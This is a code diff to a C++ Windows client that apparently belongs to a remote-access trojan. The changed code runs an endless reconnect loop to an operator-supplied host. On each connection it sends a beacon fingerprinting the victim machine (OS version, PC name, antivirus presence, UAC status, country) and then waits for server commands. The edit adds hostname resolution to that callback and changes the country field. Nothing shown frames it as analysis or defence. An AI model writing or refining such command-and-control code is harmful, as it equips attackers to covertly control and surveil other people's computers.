@@ -402,7 +402,7 @@ private:
             {"action",    "initial_info"},
             {"ip",        "127.0.0.1"},
             {"os",        getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName")},
-            {"country",   "Turkey"},
+            {"country",   "TR"},
             {"desktop",   string(pcname)},
             {"antivirus", (GetFileAttributesA("C:\\ProgramData\\Microsoft\\Windows Defender") != INVALID_FILE_ATTRIBUTES) ? "Windows Defender" : "Other/None"},
             {"uac",       "Enabled"},
@@ -412,28 +412,36 @@ private:
     }
 
 public:
-    void start(const char* ip, int port) {
+    void start(const char* host, int port) {
         while (true) {
             WSADATA wsa;
-            WSAStartup(MAKEWORD(2, 2), &wsa);
-            sock = socket(AF_INET, SOCK_STREAM, 0);
-
-            sockaddr_in addr;
-            addr.sin_family = AF_INET;
-            addr.sin_port = htons(port);
-            inet_pton(AF_INET, ip, &addr.sin_addr);
-
-            cout << "[...] Connecting to: " << ip << ":" << port << endl;
-
-            if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
-                cout << "[+] Connection successful!" << endl;
-                connected = true;
-
-                send_initial_info();
-                handle_server_messages();
+            if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+                this_thread::sleep_for(chrono::seconds(5));
+                continue;
             }
 
-            closesocket(sock);
+            struct addrinfo hints = {0}, *res = NULL;
+            hints.ai_family = AF_INET;
+            hints.ai_socktype = SOCK_STREAM;
+
+            string port_str = to_string(port);
+            if (getaddrinfo(host, port_str.c_str(), &hints, &res) == 0) {
+                sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+                if (sock != INVALID_SOCKET) {
+                    cout << "[...] Connecting to: " << host << ":" << port << endl;
+                    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == 0) {
+                        cout << "[+] Connection successful!" << endl;
+                        connected = true;
+                        freeaddrinfo(res);
+                        res = NULL;
+                        send_initial_info();
+                        handle_server_messages();
+                    }
+                    closesocket(sock);
+                    sock = INVALID_SOCKET;
+                }
+                if (res) freeaddrinfo(res);
+            }
             WSACleanup();
             this_thread::sleep_for(chrono::seconds(5));
         }
